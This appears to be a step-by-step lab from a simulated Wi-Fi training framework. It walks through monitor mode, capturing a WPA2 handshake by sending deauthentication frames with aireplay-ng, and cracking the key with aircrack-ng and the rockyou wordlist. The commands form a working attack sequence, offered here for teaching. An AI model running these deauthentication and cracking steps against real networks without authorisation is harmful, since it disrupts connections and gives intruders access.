Select "Airsuite Recon and Key Discovery" from the menu. Allow up to 30 seconds to initialize the network. 

![[04-main-menu.png]]

Two attacker panes will appear in your terminal window. 

![[04-terminals.png]]

Within one of these panes, run the following command to put the Attacker-wlan0 interface into monitor mode.

```
airmon-ng start Attacker-wlan0
```

If the following prompt appears, input "y" and hit enter. 

![[01-rfkill-error.png]]

Successful initialization will appear as pictured below. 

![[01-monitor-enabled.png]]

Check the new monitor interface. 

```
iwconfig
```

As pictured below, wlan0mon should now be present and in monitor mode.

![[01-iwconfig.png]]

Next, run airodump-ng to identify the the BSSID for WPA2_NETWORK.

```
airodump-ng wlan0mon
```

The following should appear. Note the BSSID for the WPA2_NETWORK.

![[04-airodump.png]]

After noting the BSSID for the WPA2_NETWORK, stop the process using \[CTRL + c]. Next, run airodump-ng to begin generating a capture file. 

```
airodump-ng wlan0mon -c 6 --bssid <WPA2_BSSID> -w wificap1
```

Running the above command will provide the following output. 

![[04-airodump-1.png]]

Leave this console running while performing the next steps.

Take note of one of the station macs under the STATION column in the console output (see screenshot below). 

![[04-stations.png]]

Run the following command in the other panel terminal. Replace \<WPA2_Network BSSID> and \<STATION MAC> with the WPA2_Network BSSID and any station mac respectively.

```
aireplay-ng wlan0mon -0 100 -a <WPA2_Network BSSID> -c <STATION MAC>
```

After running this command, your terminal should be spammed with the messages pictured below. 

![[04-deauth.png]]

At this point, your window should appear as the following screenshot.

![[04-deauth-waiting.png]]

Wait until the first attacker terminal display the text highlighted in red below. Let both terminals run until the first attacker terminal displays the text shown in red below. 

![[04-handshake.png]]

In either attacker terminal, use \[CTRL + C] to stop any running processes. Run the following command. 

```
aircrack-ng -w /Wifi-Forge/Framework/materials/rockyou.txt ./wificap1-01.cap 
```

It should not take long for aircrack to get the password.

![[04-key-found.png]]

In either of the terminal panes, type main_menu to return to the main menu and onto the next lab. 

NEXT LAB: [[Lab 05 - Cracking WPA Handshakes with Aircrack-ng]]